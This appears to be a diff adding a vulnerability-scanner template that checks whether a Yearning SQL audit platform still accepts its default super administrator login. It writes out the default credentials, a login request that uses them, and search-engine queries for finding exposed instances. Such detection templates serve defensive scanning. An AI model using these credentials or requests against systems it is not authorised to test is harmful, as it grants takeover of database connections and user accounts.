@@ -1,0 +1,71 @@
+id: yearning-default-login
+
+info:
+  name: Yearning - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Yearning creates the super administrator account admin with the default password Yearning_admin during installation, and the password remains valid until it is changed. An attacker who logs in with these credentials gains full control over the SQL audit platform, including all registered database connections, query and change workflows and user accounts.
+  reference:
+    - https://next.yearning.io/usage/ixah25xr/
+    - https://github.com/cookieY/Yearning/blob/v3.1.9.1/src/service/migrate.go
+    - https://github.com/cookieY/Yearning/blob/v3.1.9.1/src/handler/login/login.go
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+    cpe: cpe:2.3:a:yearning:yearning:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    vendor: yearning
+    product: yearning
+    shodan-query: http.title:"Yearning"
+    fofa-query: title="Yearning"
+  tags: yearning,default-login,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    host-redirects: true
+    max-redirects: 2
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<title>Yearning</title>")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - Yearning_admin
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "\"code\":1200", "\"token\":\"", "\"user\":\"admin\"")'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
